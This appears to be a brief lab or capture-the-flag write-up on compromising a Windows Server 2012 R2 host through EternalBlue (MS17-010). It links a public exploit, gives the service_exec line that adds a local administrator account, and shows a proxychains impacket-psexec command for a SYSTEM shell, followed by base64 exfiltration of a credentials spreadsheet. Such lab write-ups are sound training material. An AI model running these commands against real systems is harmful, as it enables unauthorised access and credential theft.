Here we find a banner saying 'Windows Server 2012 R2 Essentials' so this may be Eternalblue (ms17-010). After running nmap scripts for smb (smb-vuln*) we found it vulnerable to Eternalblue

With **[this exploit](https://www.exploit-db.com/exploits/42315)** (and **[its dependency](https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py)**), creating an admin user and using psexec we get a nt authority shell:

```bash
We have to add this line to the script in the line (in method called smb_pwn):
	
service_exec(conn, r'cmd /c net user /add ajcriado password123! && net localgroup administrators peluqqi /add')

Now we get a shell as nt authority with psexec

proxychains impacket-psexec ajcriado:'password123!'@172.16.1.20
```

Now we found an excel file inside user Desktop, we moved it by encoding it as base64 as we cannot create a smb server or have a direct connection to our attack machine. In this file we found users and their passwords (on a hidden B column) but we don't find anything related to mrb3n (the flag hint is called 'mrb3n leaves his mark'). Using command `net user mrb3n` we found the flag in the user comment.
